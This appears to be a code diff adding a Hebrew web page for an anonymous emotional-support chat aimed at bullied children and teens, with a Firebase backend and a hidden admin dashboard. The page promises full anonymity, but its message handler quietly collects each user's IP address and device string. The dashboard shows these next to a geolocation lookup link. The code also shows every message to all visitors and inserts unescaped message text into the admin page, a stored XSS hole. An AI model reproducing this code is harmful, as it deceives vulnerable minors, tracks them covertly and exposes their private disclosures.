@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>פשוט להקשיב | המקום הבטוח שלך לפרוק ולדבר באנונימיות</title>
+    <meta name="description" content="מרגישים לבד? עוברים חרם? 'פשוט להקשיב' כאן בשבילכם. צ'אט אנונימי לבני נוער וילדים, מקום בטוח לפרוק את הלב ולקבל תמיכה מבלי להיחשף.">
+    <meta name="keywords" content="פשוט להקשיב, חרם, חרם חברתי, עזרה בחרם, מניעת חרם, בריונות, בריונות ברשת, תמיכה בבני נוער, פריקה, מקום לפרוק, עזרה נפשית, בני נוער, ילדים, בית ספר, התמודדות עם בדידות, מרגיש לבד, קו חם, וואטסאפ לתמיכה, עזרה ראשונה נפשית, חרם בבית ספר, קשיים חברתיים, חרם דיגיטלי, חרם בסטורי, אלימות ברשת, מקום בטוח לדבר, לדבר עם מישהו, תמיכה רגשית, מניעת התאבדות, הגנה על ילדים, אתם לא לבד, מדברים על חרם">
+    
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="icon" href="https://ibb.co/bgLszRxL">
+
+    <style>
+        :root {
+            --primary: #4A90E2;
+            --secondary: #f3f7fa;
+            --accent: #FF5252;
+            --text: #333;
+            --admin-bg: #2c3e50;
+        }
+
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: var(--secondary); color: var(--text); }
+        .container { max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; }
+        
+        /* Header */
+        header { padding: 20px; background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { max-width: 120px; border-radius: 50%; }
+        
+        /* Hero Section */
+        .hero h1 { color: var(--primary); margin-bottom: 10px; }
+        .hero p { font-size: 1.1rem; line-height: 1.6; }
+
+        /* Chat UI */
+        #chat-window { height: 400px; background: white; border-radius: 15px; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        #messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
+        .msg { padding: 10px 15px; border-radius: 18px; max-width: 80%; word-wrap: break-word; }
+        .msg.user { background: var(--primary); color: white; align-self: flex-start; }
+        .msg.admin { background: #e1e1e1; align-self: flex-end; }
+        
+        .input-area { display: flex; padding: 10px; background: #eee; }
+        input[type="text"] { flex: 1; border: none; padding: 12px; border-radius: 25px; outline: none; }
+        button { background: var(--primary); color: white; border: none; padding: 10px 20px; border-radius: 25px; margin-right: 5px; cursor: pointer; }
+
+        /* WhatsApp Button */
+        .whatsapp-btn { background: #25D366; color: white; text-decoration: none; padding: 15px 25px; border-radius: 50px; display: inline-flex; align-items: center; gap: 10px; margin-top: 20px; font-weight: bold; }
+
+        /* Admin UI */
+        .admin-panel { display: none; background: white; min-height: 100vh; padding: 20px; }
+        .admin-login { padding: 50px 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 0.9rem; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: right; }
+        th { background: var(--admin-bg); color: white; }
+
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+<div id="user-view">
+    <header>
+        <img src="https://i.ibb.co/v6mYJp6/logo.png" alt="לוגו פשוט להקשיב" class="logo">
+        <h1>פשוט להקשיב</h1>
+    </header>
+
+    <div class="container hero">
+        <h2>אתם לא לבד. אנחנו כאן להקשיב.</h2>
+        <p>כאן תוכלו לפרוק הכל בצורה <strong>אנונימית לחלוטין</strong>. אף אחד לא יודע מי אתם, ומה שתגידו נשאר בינינו.</p>
+        
+        <div id="chat-window">
+            <div id="messages"></div>
+            <div class="input-area">
+                <input type="text" id="chat-input" placeholder="כתבו כאן משהו שיושב לכם על הלב...">
+                <button onclick="sendMessage()">שליחה</button>
+            </div>
+        </div>
+
+        <a href="https://wa.me/972505669532?text=היי%20אפשר%20לשתף%20אותך%20במשהו%20שקרה%20לי?" class="whatsapp-btn" id="wa-link">
+            <span>דברו איתנו בווטסאפ</span>
+        </a>
+    </div>
+</div>
+
+<div id="admin-login" class="container admin-login hidden">
+    <h2>כניסת מנהלים</h2>
+    <input type="email" id="admin-email" placeholder="אימייל"><br><br>
+    <input type="password" id="admin-pass" placeholder="סיסמה"><br><br>
+    <button onclick="adminLogin()">כניסה</button>
+</div>
+
+<div id="admin-dashboard" class="admin-panel hidden">
+    <h1>לוח ניהול - פשוט להקשיב</h1>
+    <div id="stats">
+        <h3>סטטיסטיקה:</h3>
+        <p id="total-users">משתמשים סה"כ: טוען...</p>
+    </div>
+    <hr>
+    <h3>שיחות פעילות ונתוני חירום:</h3>
+    <div style="overflow-x: auto;">
+        <table id="admin-table">
+            <thead>
+                <tr>
+                    <th>זמן</th>
+                    <th>הודעה</th>
+                    <th>IP / נתוני מכשיר</th>
+                    <th>מיקום מוערך</th>
+                </tr>
+            </thead>
+            <tbody id="admin-log-body"></tbody>
+        </table>
+    </div>
+    <br>
+    <button onclick="logout()" style="background:var(--accent)">התנתקות</button>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, push, onChildAdded, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+    import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyDV62F-Z3nV-R1Sfp0ornCeE7HuBU3hNpg",
+        authDomain: "just-listen-4ca8a.firebaseapp.com",
+        projectId: "just-listen-4ca8a",
+        storageBucket: "just-listen-4ca8a.firebasestorage.app",
+        messagingSenderId: "323677576794",
+        appId: "1:323677576794:web:31f23715e855209a148263"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+    const auth = getAuth(app);
+
+    // --- Mode Check ---
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('mode') === 'management') {
+        document.getElementById('user-view').classList.add('hidden');
+        document.getElementById('admin-login').classList.remove('hidden');
+    }
+
+    // --- User Logic ---
+    window.sendMessage = () => {
+        const input = document.getElementById('chat-input');
+        if (!input.value.trim()) return;
+
+        // איסוף נתוני חירום באופן שקט
+        fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+            const userIP = data.ip;
+            const userAgent = navigator.userAgent;
+            
+            push(ref(db, 'messages'), {
+                text: input.value,
+                timestamp: Date.now(),
+                ip: userIP,
+                device: userAgent,
+                type: 'user'
+            });
+            input.value = '';
+        });
+    };
+
+    onChildAdded(ref(db, 'messages'), (snapshot) => {
+        const msg = snapshot.val();
+        const div = document.createElement('div');
+        div.className = `msg ${msg.type}`;
+        div.innerText = msg.text;
+        document.getElementById('messages').appendChild(div);
+        document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
+    });
+
+    // --- Admin Logic ---
+    window.adminLogin = () => {
+        const email = document.getElementById('admin-email').value;
+        const pass = document.getElementById('admin-pass').value;
+        signInWithEmailAndPassword(auth, email, pass)
+            .catch(err => alert("שגיאה בפרטים"));
+    };
+
+    onAuthStateChanged(auth, (user) => {
+        if (user) {
+            document.getElementById('admin-login').classList.add('hidden');
+            document.getElementById('admin-dashboard').classList.remove('hidden');
+            loadAdminData();
+        }
+    });
+
+    function loadAdminData() {
+        onValue(ref(db, 'messages'), (snapshot) => {
+            const tbody = document.getElementById('admin-log-body');
+            tbody.innerHTML = '';
+            let count = 0;
+            snapshot.forEach(child => {
+                const data = child.val();
+                count++;
+                const row = `<tr>
+                    <td>${new Date(data.timestamp).toLocaleString('he-IL')}</td>
+                    <td>${data.text}</td>
+                    <td>${data.ip}<br><small>${data.device.substring(0,30)}...</small></td>
+                    <td><a href="https://ipapi.co/${data.ip}/json/" target="_blank">פרטי מיקום</a></td>
+                </tr>`;
+                tbody.innerHTML = row + tbody.innerHTML;
+            });
+            document.getElementById('total-users').innerText = `סה"כ הודעות במערכת: ${count}`;
+        });
+    }
+
+    window.logout = () => signOut(auth).then(() => window.location.reload());
+
+</script>
+</body>
+</html>
